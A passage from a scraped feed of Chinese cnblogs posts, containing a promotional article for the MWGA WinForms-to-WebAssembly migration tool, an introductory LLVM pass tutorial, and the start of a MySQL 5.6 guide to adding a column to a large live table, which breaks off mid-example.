href=\"https://www.cnblogs.com/sun-10387834/p/19452600\" target=\"_blank\">https://www.cnblogs.com/sun-10387834/p/19452600</a></p>\n\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-02 16:25</span>&nbsp;\n<a href=\"https://www.cnblogs.com/sun-10387834\">佛祖让我来巡山</a>&nbsp;\n阅读(<span id=\"post_view_count\">0</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "MWGA让千亿行代码在Web端“复活”！",
      "link": "https://www.cnblogs.com/xdesigner/p/19565029",
      "published": "",
      "description": "<h2>\n\t\t\t<a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/xdesigner/p/19565029\" id=\"cb_post_title_url\" title=\"发布于 2026-02-02 16:09\">\n    <span>MWGA让千亿行代码在Web端“复活”！</span>\n    \n\n</a>\n\n\t\t</h2>\n\t\t<div class=\"postText\">    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        \n        南京都昌信息研发的 MWGA——一款能够帮助企业和开发者将使用GDI+绘图的复杂的传统Winforms程序快速、低成本迁移到Blazor WASM平台的迁移工具！它打破了Winforms程序难以跨平台、适配性差的困境，仅需极低修改量（通常不超过10%）就能将传统Winforms程序无缝转为可网页加载的Blazor WASM版本。\n这意味着，企业无需重写业务逻辑，无需学习全新前端框架，更无需招募额外的前端开发人员——一套代码，同时编译为.exe与.wasm，双端运行，体验一致！为企业节省大量开发成本与时间，尤其适配医疗等对信创有迫切需求的行业！\n    </div>\n<div class=\"blogpost-body blogpost-body-html\" id=\"cnblogs_post_body\">\n<p><span>特大喜讯！南京都昌信息研发的&nbsp;MWGA——一款能够帮助企业和开发者将使用GDI+绘图的复杂的传统Winforms程序快速、低成本迁移到Blazor WASM平台的迁移工具！它打破了Winforms程序难以跨平台、适配性差的困境，仅需极低修改量（通常不超过10%）就能将传统Winforms程序无缝转为可网页加载的Blazor WASM版本。</span></p>\n<p><span>这意味着，企业无需重写业务逻辑，无需学习全新前端框架，更无需招募额外的前端开发人员——一套代码，同时编译为.exe与.wasm，双端运行，体验一致！为企业节省大量开发成本与时间，尤其适配医疗等对信创有迫切需求的行业！</span></p>\n<h1><strong class=\"135brush\"><strong>一、</strong></strong><strong class=\"135brush\"><strong>极低修改，极高还原</strong></strong></h1>\n<p><span>通过MWGA，原本只能在Windows桌面运行的Winforms程序，无需重写，即可转变为通过浏览器访问的WebAssembly应用。以下为三个案例展示：</span></p>\n<span><strong>案例一：经典扫雷游戏（2500行代码）</strong></span>\n<p><span><em>图1：winfrom版</em></span></p>\n<p><span><em>扫雷是一个经典的Windows游戏程序，这是一个10年前写的Winforms程序，包含约2500行C#代码以及若干图片资源文件</em></span></p>\n<p><img alt=\"扫雷游戏\" src=\"https://img2024.cnblogs.com/blog/12406/202601/12406-20260119115236297-958633113.png\" /></p>\n<p><span><em>图2：转换后</em></span></p>\n<p><span><em>我们对旧代码修改了不超过50行(占比2%)就让同一套代码可以无需修改即可编译成 .exe 和.wasm文件。</em></span></p>\n<p><span><img alt=\"图片2\" src=\"https://img2024.cnblogs.com/blog/12406/202601/12406-20260119115330834-395365830.png\" /></span></p>\n<p><span>综上</span></p>\n<p><span><strong>（1）原项目：</strong>10年前编写的Winforms扫雷游戏，依赖GDI+进行界面绘制。</span></p>\n<p><span><strong>（2）迁移过程：</strong>使用MWGA导入项目，仅修改约50行代码（占比2%），主要使用&nbsp;#if&nbsp; MWGA&nbsp;条件编译，将部分同步方法改为异步适配。</span></p>\n<p><span><strong>（3）结果：</strong>同一套代码无需改动绘图逻辑，直接编译为.wasm文件，在Chrome、Firefox、Safari等浏览器中完美运行，界面与交互与原生一致！</span></p>\n<p><span>若没有MWGA，用户还需从前端重写整个游戏，耗时耗力，成本高。而现在，原开发人员可直接在Winforms项目上继续迭代，同步生成网页版！</span></p>\n<p>&nbsp;</p>\n<span><strong>案例二：智能计算器（460行代码）</strong></span>\n<p><span><em>图3：winfrom版</em></span></p>\n<p><span><em>这是一个Winform.NET的计算器程序，包含460行C#代码</em></span></p>\n<p><span style=\"font-size: 16px;\"><em><img alt=\"计算器\" src=\"https://img2024.cnblogs.com/blog/12406/202601/12406-20260119115427518-107951139.png\" /></em></span></p>\n<p><span style=\"font-size: 16px;\"><em>图4：转换后</em></span></p>\n<p><span style=\"font-size: 16px;\"><em>代码未做任何修改，借助MWGA，它在Blazor WASM中运行界面如下图所示。</em></span></p>\n<p><span><img alt=\"图片4\" src=\"https://img2024.cnblogs.com/blog/12406/202601/12406-20260119115505304-749089367.png\" /></span></p>\n<p><span>综上</span></p>\n<p><span><strong>（1）原项目：</strong>Winforms计算器，支持窗体拖拽自适应布局。</span></p>\n<p><span><strong>（2）迁移过程：</strong>代码零修改，直接通过MWGA迁移至Blazor WASM。</span></p>\n<p><span><strong>（3）结果：</strong>在浏览器中运行，窗体大小调整、按钮自适应布局等行为完全保留，用户体验无损迁移！</span></p>\n<p><span>&nbsp;</span></p>\n<span><strong>案例三：时间轴产品，1%代码修改量）</strong></span>\n<p><span>时间轴产品是南京都昌公司的一个WinForms软件产品，现已开源，这是一个面向医院的专业软件产品。</span></p>\n<p><span><strong><img alt=\"图片5\" src=\"https://img2024.cnblogs.com/blog/12406/202602/12406-20260202160302680-1041140241.png\" /></strong></span></p>\n<p><span><strong>原项目：</strong>这是一个7万行代码的WinForms医疗绘图软件，重度依赖Windows的GDI+图形库。</span></p>\n<p><span><strong>迁移过程：</strong>借助MWGA框架，通过添加极少量（约1%）的异步适配代码，使同一套代码能同时编译为桌面程序和WebAssembly应用。</span></p>\n<p><span><strong>迁移结果：</strong>该软件成功在浏览器中原样运行，证明了无需重写即可将复杂C#桌面软件低成本迁移至Web平台。</span></p>\n<p><strong class=\"135brush\"><strong><img alt=\"图片6\" src=\"https://img2024.cnblogs.com/blog/12406/202602/12406-20260202160321078-1847393760.jpg\" /></strong></strong></p>\n<h1><strong class=\"135brush\"><strong>二、广泛适配</strong></strong></h1>\n<p><span>MWGA全面兼容多平台操作系统，包括Windows 7/10/11、Linux、Android、macOS以及统信UOS、麒麟、方德等国产信创系统。应用完全基于浏览器运行，不依赖特定Windows版本，也无需安装独立客户端。转换后的应用可直接部署于标准Web服务器，用户通过Chrome（v95+）、Edge、Firefox（v133+）、Safari等主流浏览器即可访问，无需更换硬件或升级系统，轻松实现应用现代化与合规化。</span></p>\n<p><strong><span>（1）在Windows 7中运行界面如下：</span></strong></p>\n<p><strong><span><img alt=\"图片7\" src=\"https://img2024.cnblogs.com/blog/12406/202602/12406-20260202160401296-9140087.jpg\" /></span></strong></p>\n<p>&nbsp;</p>\n<p><span><strong>（2）在谷歌浏览器中运行的效果如下：</strong></span></p>\n<p><strong><span><img alt=\"图片8\" src=\"https://img2024.cnblogs.com/blog/12406/202602/12406-20260202160426956-315964826.jpg\" /></span></strong></p>\n<p>&nbsp;</p>\n<p><strong><span>（3）在Firefox中运行的效果：</span></strong></p>\n<p><strong><span><img alt=\"图片9\" src=\"https://img2024.cnblogs.com/blog/12406/202602/12406-20260202160758522-570347954.jpg\" /></span></strong></p>\n<p>&nbsp;</p>\n<p><strong><span>（4）在苹果系统中运行的效果：</span></strong></p>\n<p><span><strong><img alt=\"图片10\" src=\"https://img2024.cnblogs.com/blog/12406/202602/12406-20260202160815014-1508511479.jpg\" /></strong></span></p>\n<p><span><strong>（5）在苹果pad中运行的效果：</strong></span></p>\n<p><img alt=\"图片11.jpg\" src=\"https://bexp.135editor.com/files/users/1658/16581196/202602/XIfaemfq_Q74w.jpg?auth_key=1770566399-0-0-85b73e984965158d622f0244d80518dc\" /></p>\n<p><span><strong>（6）在华为pad中运行的效果：</strong></span></p>\n<p><img alt=\"图片12.jpg\" src=\"https://bexp.135editor.com/files/users/1658/16581196/202602/RFUdjSbk_GMNP.jpg?auth_key=1770566399-0-0-086fb31ad63bdcef31fbcf8017898bcd\" /></p>\n<p><span><strong>（7）在苹果手机端运行效果如下：</strong></span></p>\n<p><img alt=\"图片13.png\" src=\"https://bexp.135editor.com/files/users/1658/16581196/202602/yH2Z4tOe_K8re.png?auth_key=1770566399-0-0-9319348da9ee7e23d623be43400fcbb6\" /></p>\n<p><span><strong>（8）在安卓手机端运行效果如下：</strong></span></p>\n<p><img alt=\"图片14.jpg\" src=\"https://bexp.135editor.com/files/users/1658/16581196/202602/HfAKpuk9_92EL.jpg?auth_key=1770566399-0-0-36fcf28439eb68eb75956bd8f7c11587&amp;x-bce-process=image/crop,x_0,y_0,w_394,h_337\" /></p>\n<p><img alt=\"图片15.jpg\" src=\"https://bexp.135editor.com/files/users/1658/16581196/202602/LSFhnIMh_zEkM.jpg?auth_key=1770566399-0-0-13d14553adfd143ec49f771e0423d178\" /></p>\n<h1>&nbsp;三、<strong class=\"135brush\"><strong>转化后的优势，为什么选择MWGA？</strong></strong></h1>\n<p><span><strong>1、迁移效率高：</strong>导入即渲染，适配快，从WinForms到Web仅需数小时</span></p>\n<p><span><strong>2、代码改动少：</strong>平均修改量＜10%，大量业务逻辑与绘图代码可直接复用</span></p>\n<p><span><strong>3、技术门槛低：</strong>无需Blazor或前端经验，WinForms开发人员直接上手</span></p>\n<p><span><strong>4、成本极低：</strong>省去重写人力、学习成本与长期维护成本</span></p>\n<p><span><strong>5、支持GDI+绘图：</strong>系统绘图代码无需重构，直接迁移至Canvas渲染</span></p>\n<p><span><strong>6、跨平台运行：</strong>支持Windows、Linux、Android及主流国产系统</span></p>\n<p><span>对于企业而言，将Winforms应用重写为Web版通常意味着从零开始、高昂的成本与漫长的周期。MWGA的出现，彻底改变了这一局面。企业无需招聘专门的前端开发团队，无需废弃经过多年积累的业务逻辑代码。只需在原有Winforms项目基础上，通过MWGA进行转换，即可同步获得Web版本。未来功能迭代，也只需在Winforms项目中修改一次，便能同步至Web端，极大降低了维护成本和双端不一致的风险。</span></p>\n<h1>&nbsp;四、<strong class=\"135brush\"><strong>立即体验</strong></strong></h1>\n<p>M<span>WGA现已开放下载与试用，欢迎访问我们的GitHub主页获取演示项目与使用指南：</span></p>\n<p><span>🔗 下载地址：<a href=\"https://github.com/dcsoft-yyf/MWGA\" rel=\"noopener nofollow\" target=\"_blank\">https://github.com/dcsoft-yyf/MWGA</a></span></p>\n<p><span>📧 联系我们：<a href=\"mailto:28348092@qq.com\" rel=\"noopener nofollow\">28348092@qq.com</a></span></p>\n<p>&nbsp;</p>\n<p><span>迁移前后代码量对比图（图示为示例，实际修改量依项目复杂度而定）：</span></p>\n<p><strong class=\"135brush\"><img alt=\"图片16\" src=\"https://img2024.cnblogs.com/blog/12406/202602/12406-20260202160902626-1390836694.png\" /></strong></p>\n<p><strong class=\"135brush\">END</strong></p>\n<p><img height=\"145\" src=\"https://bexp.135editor.com/files/users/1658/16581196/202602/7rG2PuJH_shWu.jpg?auth_key=1770566399-0-0-5bf797861484c19f5b5976bcb153f14d\" width=\"145\" /></p>\n<p><strong class=\"135brush\">扫码关注</strong></p>\n<p><span class=\"135brush\">南京都昌信息</span></p>\n<p><span class=\"135brush\">一起共创美好未来</span></p>\n\n</div>\n<div class=\"clear\"></div>\n</div>\n\t\t<p class=\"postfoot\">\n\t\t\tposted on \n<span id=\"post-date\">2026-02-02 16:09</span>&nbsp;\n<a href=\"https://www.cnblogs.com/xdesigner\">袁永福 电子病历，医疗信息化</a>&nbsp;\n阅读(<span id=\"post_view_count\">116</span>)&nbsp;\n评论(<span id=\"post_comment_count\">1</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n\n\t\t</p>"
    },
    {
      "title": "LLVM Pass快速入门(二)：运行第一个pass",
      "link": "https://www.cnblogs.com/ClownLMe/p/19564658",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/ClownLMe/p/19564658\" id=\"cb_post_title_url\" title=\"发布于 2026-02-02 15:17\">\n    <span>LLVM Pass快速入门(二)：运行第一个pass</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h1 id=\"认识pass层级结构\">认识Pass层级结构</h1>\n<p><strong>Pass</strong>范围从上到下一共分为5个层级：</p>\n<ul>\n<li><strong>模块层级</strong>：单个<code>.ll</code>或<code>.bc</code>文件</li>\n<li><strong>调用图层级</strong>：函数调用的关系。</li>\n<li><strong>函数层级</strong>：单个函数。</li>\n<li><strong>基本块层级</strong>：单个代码块。例如C语言中<code>{}</code>括起来的最小代码。</li>\n<li><strong>指令层级</strong>：单个IR指令。</li>\n</ul>\n<p><strong>注意：下面代码最好不要用中文，使用起来非常麻烦，控制台，编译，目标文件的编码不同会造成乱码。</strong></p>\n<h1 id=\"项目目录如下\">项目目录如下</h1>\n<pre><code>/MyProject\n├── CMakeLists.txt # CMake 配置文件\n├── build/ #构建目录\n│   └── test.c #测试编译代码\n└── mypass1.cpp # pass 项目代码\n</code></pre>\n<h3 id=\"一测试代码示例\">一，测试代码示例</h3>\n<p><strong>test.c</strong></p>\n<pre><code class=\"language-c\">#include &lt;stdio.h&gt;\n\nvoid secret_function() {\n&nbsp; &nbsp; printf(\"I am secret\\n\");\n}\n\nint main() {\n&nbsp; &nbsp; secret_function();\n&nbsp; &nbsp; return 0;\n}\n</code></pre>\n<h3 id=\"二pass编写\">二，Pass编写</h3>\n<p>项目描述：通过解析下面代码的IR，将下面代码中的函数名打印出来。<br />\n<strong>mypass1.cpp</strong></p>\n<pre><code class=\"language-c\">#include \"llvm/IR/PassManager.h\"\n#include \"llvm/Passes/PassBuilder.h\"\n#include \"llvm/Passes/PassPlugin.h\"\n#include \"llvm/Support/raw_ostream.h\"\n\nusing namespace llvm;\n\n// 这个结构体基本是固定模板\nnamespace {\n    struct mypass1 : public PassInfoMixin&lt;mypass1&gt; {\n\t    //函数回调，每次遇到函数时调用（这里有重载，存在多种入口方式，可以以模块为入口）\n        PreservedAnalyses run(Function &amp;F, FunctionAnalysisManager &amp;) {\n\t        //这里是主要的逻辑代码，我们主要学习的代码在这\n\t        \n\t        //打印出当前函数的名字\n            errs() &lt;&lt; \"Found Function: \" &lt;&lt; F.getName() &lt;&lt; \"\\n\";\n            \n            //只读时返回：PreservedAnalyses::all()\n            //存在修改时：PreservedAnalyses::none()\n            return PreservedAnalyses::all();\n        }\n    };\n\n}\n\n//下面基本上是固定的模板，每个pass没什么变化，可以直接复制粘贴，或者背熟。\n//直接使用需要修改的是下面的&lt;模块名称，版本号，调用参数，和调用的pass结构体&gt;\nextern \"C\" LLVM_ATTRIBUTE_WEAK::llvm::PassPluginLibraryInfo\nllvmGetPassPluginInfo() {\n    return {\n        LLVM_PLUGIN_API_VERSION,//版本信息\n        \"mypass1\",//模块信息，自定义\n        \"v0.1\",//版本号，自定义\n        [](PassBuilder &amp;PB) {\n            PB.registerPipelineParsingCallback(\n                [](StringRef Name, FunctionPassManager &amp;FPM,\n                   ArrayRef&lt;PassBuilder::PipelineElement&gt;) {\n                    if (Name == \"mypass1\") {//调用参数\n                        FPM.addPass(mypass1());//上面pass结构体\n                        return true;\n                    }\n                    return false;\n                }\n            );\n        }\n    };\n}\n</code></pre>\n<h3 id=\"三pass的构建\">三，Pass的构建</h3>\n<p>构建LLVM Pass需要写<code>CMakeLists.txt</code>构建声明</p>\n<h5 id=\"1-配置cmake配置文件\">1. 配置CMake配置文件</h5>\n<p><strong>CMakeLists.txt</strong><br />\n下面的<code>cmake</code>配置可以直接拿去用，我已经标注好需要修改的位置</p>\n<pre><code class=\"language-python\">#cmake 版本，可通过 cmake --version 判断\ncmake_minimum_required(VERSION 4.1.1) #----&gt;修改 cmake版本号\n#项目名字\nproject(mypass1) #----&gt;修改 项目名称\n\n#导入项目的 LLVM cmake 配置文件路径(如果根据我之前文章安装这里就相同)\nset(LLVM_DIR \"D:/LLVM/llvm-project/build/lib/cmake/llvm\")#----&gt;修改 llvm cmake配置路径\n#寻找 LLVM 的包文件\n#REQUIRED 找不到 LLVM 则停止构建\n#强制使用 LLVM 安装时生成的配置文件进行定位\nfind_package(LLVM REQUIRED CONFIG)\n#将 LLVM 的 CMake 模块路径添加到当前 CMake 搜索路径中，以便后续使用 include(AddLLVM)。\nlist(APPEND CMAKE_MODULE_PATH \"${LLVM_CMAKE_DIR}\")\n\n#引入 LLVM 提供的专用 CMake 宏\ninclude(AddLLVM)\n#将 LLVM 的头文件目录（如 llvm/IR/Function.h）加入编译器的搜索路径\ninclude_directories(${LLVM_INCLUDE_DIRS})\n#导入 LLVM 编译时使用的宏定义\nadd_definitions(${LLVM_DEFINITIONS})\n#设置 C++ 标准为 C++17。(这里如果不用17编译会报错)\nset(CMAKE_CXX_STANDARD 17)\n#强制要求必须支持 C++17，如果编译器不支持则失败。\nset(CMAKE_CXX_STANDARD_REQUIRED ON)\n\n#创建一个模块化的库(.dll)\nadd_library(mypass8 MODULE mypass8.cpp) #----&gt;修改 项目名称，文件名\n#windows不用会报错：导出符号\n#LLVM Pass 需要暴露一些特定的入口点（如 getAnalysisUsage）给 opt 工具调用。\nset_target_properties(mypass8 PROPERTIES WINDOWS_EXPORT_ALL_SYMBOLS ON) #----&gt;修改 项目名称\n# 指定该 Pass 需要链接的 LLVM 核心组件。 \n# LLVMCore: 提供 IR、Function、Module 等核心类。 \n# LLVMSupport: 提供各种辅助工具类（如 errs() 输出）。\ntarget_link_libraries(mypass8 LLVMCore LLVMSupport) #----&gt;修改 项目名称，文件名  \n# 为该目标设置特定的编译器选项。 \n# /utf-8: 告诉 MSVC 编译器使用 UTF-8 编码处理源代码，防止中文注释引起的乱码或编译错误。  \ntarget_compile_options(mypass8 PRIVATE /utf-8)#----&gt;修改 项目名称，文件名\n</code></pre>\n<h5 id=\"2编译并构建pass\">2.编译并构建Pass</h5>\n<p><strong>打开visual studio<code>的工作台，我这里是</code>x64 Native Tools Command Prompt for VS 2022`</strong></p>\n<p>进到<code>build</code>目录</p>\n<pre><code class=\"language-bash\">#构建项目\n#其中-DCMAKE_BUILD_TYPE=RelWithDebInfo不选会报错，由于我之前编译的是带符号的relase版本\ncmake -G \"Ninja\"  -DCMAKE_BUILD_TYPE=RelWithDebInfo ..\n#编译\nninja\n</code></pre>\n<p>最后出现下面提示，即为编译成功</p>\n<pre><code class=\"language-bash\">[2/2] Linking CXX shared module mypass1.dll\n</code></pre>\n<h3 id=\"四使用你第一个pass\">四，使用你第一个Pass</h3>\n<p>进到<code>build</code>目录</p>\n<pre><code class=\"language-bash\">#把.c文件编译为.ll\n#-O1 使用O1优化（这里我尝试-O0不优化，会导致我的pass无法应用）\n#-Xclang -disable-llvm-passes 不使用默认的pass优化\nclang -S -emit-llvm -O1 -Xclang -disable-llvm-passes test.c -S -o test.ll\n\n#使用pass\nopt -load-pass-plugin=mypass1.dll -passes=mypass1  test.ll -S -o test_opt.ll\n</code></pre>\n<p><strong>输出结果</strong></p>\n<pre><code class=\"language-bash\">Found Function: sprintf\nFound Function: vsprintf\nFound Function: _snprintf\nFound Function: _vsnprintf\nFound Function: secret_function\nFound Function: printf\nFound Function: main\nFound Function: _vsprintf_l\nFound Function: _vsnprintf_l\nFound Function: __local_stdio_printf_options\nFound Function: _vfprintf_l\n</code></pre>\n<p><strong>如果❤喜欢❤本系列教程，就点个关注吧，后续不定期更新~</strong></p>\n\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-02 15:17</span>&nbsp;\n<a href=\"https://www.cnblogs.com/ClownLMe\">ClownLMe</a>&nbsp;\n阅读(<span id=\"post_view_count\">26</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "MySQL 5.6 2000 万行高频读写表新增字段实战：从慢执行到无锁落地全解析",
      "link": "https://www.cnblogs.com/xxhxs-21/p/19564624",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/xxhxs-21/p/19564624\" id=\"cb_post_title_url\" title=\"发布于 2026-02-02 15:13\">\n    <span>MySQL 5.6 2000 万行高频读写表新增字段实战：从慢执行到无锁落地全解析</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        <img alt=\"MySQL 5.6 2000 万行高频读写表新增字段实战：从慢执行到无锁落地全解析\" class=\"desc_img\" src=\"https://img2024.cnblogs.com/blog/1869035/202602/1869035-20260202151226843-1773744596.png\" />\n        MySQL 5.6 2000 万行高频读写表新增字段实战：从慢执行到无锁落地全解析\n    </div>\n<div class=\"blogpost-body blogpost-body-html\" id=\"cnblogs_post_body\">\n<h2><span>一、背景与问题缘起</span></h2>\n<p><span>MySQL 5.6.51 版本下 2000 万行核心业务表开展新增字段操作，需求为新增<code></code><code>BIGINT(19) NOT NULL DEFAULT 0 COMMENT '注释'</code>（因业务实际需要存储大数值关联字段）。</span></p>\n<p><span>表的核心特性为Java 多线程密集读写，业务请求持续高频，初始执行原生<code>ALTER TABLE</code>语句时出现两大核心问题：</span></p>\n<ol>\n<li><span>72 万行测试表执行耗时 203 秒，线性推算 2000 万行表耗时超 1.5 小时；</span></li>\n<li><span>生产执行时触发表锁、查询失效，严重影响业务正常运行。</span></li>\n</ol>\n<div><span>本次实操的核心挑战集中在：MySQL 5.6 版本未支持高版本的表结构元数据原地修改优化、大表全量数据拷贝的 IO 资源占用、高频读写场景下的资源竞争、MDL 锁等待导致的锁表风险，需通过针对性方案实现无锁、无业务感知、高效的字段新增。</span></div>\n<h2><span>二、核心问题根源剖析</span></h2>\n<h3><span>2.1 MySQL 5.6 Online DDL 的先天局限</span></h3>\n<div><span>MySQL 5.6 虽引入 InnoDB Online DDL 特性，解决了传统 DDL 锁表阻塞业务的问题，但未支持高版本（5.7/8.0）的元数据原地修改优化—— 新增任何类型字段均需全表拷贝数据，而拷贝过程会占用大量磁盘 IO，这是大表 DDL 执行慢的核心根源。尤其对于 2000 万行表，全表拷贝的 IO 开销成为性能瓶颈，72 万行小表测试耗时 203 秒的核心原因也在于此。</span></div>\n<div>\n<h3><span>2.2&nbsp;显式默认值对 DDL 的优化作用</span></h3>\n</div>\n<div><span>MySQL 5.6 对原生数值类型（TINYINT/INT/BIGINT）+ 简单常量默认值（如 0）的 DDL 操作有轻量级优化：无默认值时需全表拷贝 + 逐行初始化字段值，而显式指定默认值后会优化为全表拷贝 + 批量赋值默认值，减少 60% 以上的 IO 开销，且该优化对数值类型的适配性远优于 VARCHAR 类型（BIGINT 比 VARCHAR 的执行效率更高、资源占用更低）。</span></div>\n<div>\n<h3><span>2.3&nbsp;锁表的真正元凶：MDL 锁等待与长事务阻塞</span></h3>\n</div>\n<div><span>执行<code>ALTER TABLE</code>时出现的表锁、查询失效，并非 DDL 本身锁表，而是 MySQL 5.6 的 MDL（元数据锁）机制导致：</span><ol>\n<li><span>DDL 执行前需获取表的MDL 排他锁（X 锁），而普通读写操作会持有MDL 共享锁（S 锁），X 锁与任何锁互斥；</span></li>\n<li><span>若执行 DDL 时表上存在未提交长事务、慢查询、空闲长连接（持有 S 锁未释放），DDL 会进入<code>Waiting for table metadata lock</code>状态；</span></li>\n<li><span>MySQL 5.6 的 MDL 锁等待为阻塞式且无超时机制，后续所有读写请求（包括新的 SELECT）都会排队阻塞，表现为 “表被锁、查询失效”。</span></li>\n</ol>\n<h3><span>2.4&nbsp;耗时非线性的核心原因</span></h3>\n<p><span>72 万行表 203 秒的测试结果无法线性推算 2000 万行表耗时，因 MySQL 5.6 执行优化后的 DDL 时，单位行耗时会随数据量增大而降低：</span></p>\n<ol>\n<li><span>大表支持批量块拷贝，能充分发挥磁盘连续 IO 优势，减少寻道时间；</span></li>\n<li><span>大表处理过程中InnoDB 缓冲池缓存命中率更高，减少物理 IO 次数；</span></li>\n<li><span>小表数据分散，存在部分随机 IO，调度和 IO 开销相对更高。</span></li>\n</ol>\n<h2><span>三、适配 MySQL 5.6 的最优 DDL 语句</span></h2>\n<p><span>针对 2000 万行表、BIGINT 类型、默认值 0 的需求，结合 MySQL 5.6 的优化特性，确定最优 DDL 语句，显式指定所有属性以最大化触发优化：</span></p>\n<div class=\"cnblogs_code\">\n<pre><span><span style=\"color: rgba(0, 0, 255, 1);\">ALTER</span> <span style=\"color: rgba(0, 0, 255, 1);\">TABLE</span><span style=\"color: rgba(0, 0, 0, 1);\"> 表名 \n</span><span style=\"color: rgba(0, 0, 255, 1);\">ADD</span> <span style=\"color: rgba(0, 0, 255, 1);\">COLUMN</span> 字段名 <span style=\"color: rgba(0, 0, 255, 1);\">BIGINT</span>(<span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">19</span>) <span style=\"color: rgba(128, 128, 128, 1);\">NOT</span> <span style=\"color: rgba(0, 0, 255, 1);\">NULL</span> <span style=\"color: rgba(0, 0, 255, 1);\">DEFAULT</span> <span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">0</span> COMMENT <span style=\"color: rgba(255, 0, 0, 1);\">'</span><span style=\"color: rgba(255, 0, 0, 1);\">注释</span><span style=\"color: rgba(255, 0, 0, 1);\">'</span>;</span></pre>\n</div>\n<p><span>语句关键属性说明</span></p>\n<ol>\n<li><span><code>BIGINT(19)</code>：原生数值类型，取值范围覆盖超大整数（-9223372036854775808~9223372036854775807），19 为显示宽度（匹配有符号最大位数，不限制实际取值）；</span></li>\n<li><span><code>NOT NULL DEFAULT 0</code>：核心优化点，简单常量默认值触发 MySQL 5.6 批量赋值优化，非空设置避免 NULL 值，简化业务代码空值判断；</span></li>\n<li><span>显式注释：提升表结构可读性，便于后续维护。</span></li>\n</ol>\n<div><span>若需新增 VARCHAR 类型字段，需显式指定<code>DEFAULT ''</code>触发优化：</span></div>\n<div>\n<div class=\"cnblogs_code\">\n<pre><span><span style=\"color: rgba(0, 0, 255, 1);\">ALTER</span> <span style=\"color: rgba(0, 0, 255, 1);\">TABLE</span><span style=\"color: rgba(0, 0, 0, 1);\"> 表名\n</span><span style=\"color: rgba(0, 0, 255, 1);\">ADD</span> <span style=\"color: rgba(0, 0, 255, 1);\">COLUMN</span> 字段名 <span style=\"color: rgba(0, 0, 255, 1);\">VARCHAR</span>(<span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">50</span>) <span style=\"color: rgba(0, 0, 255, 1);\">DEFAULT</span> <span style=\"color: rgba(255, 0, 0, 1);\">''</span> COMMENT <span style=\"color: rgba(255, 0, 0, 1);\">'</span><span style=\"color: rgba(255, 0, 0, 1);\">注释</span><span style=\"color: rgba(255, 0, 0, 1);\">'</span>;</span></pre>\n</div>\n</div>\n<h2><span>四、生产环境无锁落地全流程方案</span></h2>\n<h3><span>4.1 执行前准备：清锁源 + 低峰期 + 参数调优（核心避坑）</span></h3>\n<h4><span>4.1.1 选择极致低峰期执行</span></h4>\n<div><span>建议：优先选择凌晨 2:00-4:00，或其他业务低峰期，减少活跃事务，降低 MDL 锁等待概率。</span></div>\n<h4><span>4.1.2 强制清理锁源（必做，避免 MDL 锁等待）</span></h4>\n<div><span>执行 DDL 前踢掉空闲长连接、终止长事务 / 慢查询，释放所有未提交的 S 锁：</span></div>\n<div>\n<div class=\"cnblogs_code\">\n<pre><span><span style=\"color: rgba(0, 128, 128, 1);\">--</span><span style=\"color: rgba(0, 128, 128, 1);\"> 1. 临时缩短长连接超时时间，踢掉空闲连接</span>\n<span style=\"color: rgba(0, 0, 255, 1);\">SET</span> GLOBAL wait_timeout <span style=\"color: rgba(128, 128, 128, 1);\">=</span> <span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">10</span><span style=\"color: rgba(0, 0, 0, 1);\">;\n</span><span style=\"color: rgba(0, 0, 255, 1);\">SET</span> GLOBAL interactive_timeout <span style=\"color: rgba(128, 128, 128, 1);\">=</span> <span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">10</span><span style=\"color: rgba(0, 0, 0, 1);\">;\n</span><span style=\"color: rgba(0, 0, 255, 1);\">SELECT</span> SLEEP(<span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">15</span>); <span style=\"color: rgba(0, 128, 128, 1);\">--</span><span style=\"color: rgba(0, 128, 128, 1);\"> 等待15秒让连接自动断开</span><span style=\"color: rgba(0, 128, 128, 1);\">\n--</span><span style=\"color: rgba(0, 128, 128, 1);\"> 2. 恢复长连接超时默认值（8小时）</span>\n<span style=\"color: rgba(0, 0, 255, 1);\">SET</span> GLOBAL wait_timeout <span style=\"color: rgba(128, 128, 128, 1);\">=</span> <span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">28800</span><span style=\"color: rgba(0, 0, 0, 1);\">;\n</span><span style=\"color: rgba(0, 0, 255, 1);\">SET</span> GLOBAL interactive_timeout <span style=\"color: rgba(128, 128, 128, 1);\">=</span> <span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">28800</span><span style=\"color: rgba(0, 0, 0, 1);\">;\n</span><span style=\"color: rgba(0, 128, 128, 1);\">--</span><span style=\"color: rgba(0, 128, 128, 1);\"> 3. 主动终止目标表上的慢查询/长事务（替换库名、表名）</span>\n<span style=\"color: rgba(0, 0, 255, 1);\">SELECT</span> CONCAT(<span style=\"color: rgba(255, 0, 0, 1);\">'</span><span style=\"color: rgba(255, 0, 0, 1);\">KILL </span><span 